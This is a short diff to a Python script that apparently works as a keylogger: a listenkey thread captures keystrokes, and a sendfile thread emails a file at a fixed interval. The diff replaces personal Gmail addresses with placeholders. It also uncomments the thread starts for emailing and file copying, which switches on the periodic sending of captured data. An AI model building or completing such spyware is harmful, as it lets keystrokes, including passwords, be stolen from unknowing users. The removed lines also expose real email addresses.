@@ -34,8 +34,8 @@ def sendfile(threadName, delay):
  while (True):
      print ("sending")
      time.sleep(delay)
-     fromaddr = "syedhammad1000@gmail.com"
-     toaddr = "shammad287@gmail.com"
+     fromaddr = "from@gmail.com"
+     toaddr = "to@gmail.com"
        
     
      msg = MIMEMultipart() 
@@ -103,8 +103,8 @@ def listenkey(threadName):
             l.join()
 try:
    _thread.start_new_thread( listenkey, ("Thread-1",) )
-  # _thread.start_new_thread( sendfile, ("Thread-2", 10, ) )
-   #_thread.start_new_thread(copyfile,("Thread3",))
+   _thread.start_new_thread( sendfile, ("Thread-2", 10, ) )
+   _thread.start_new_thread(copyfile,("Thread3",))
 except:
    print ("Error: unable to start thread")
 
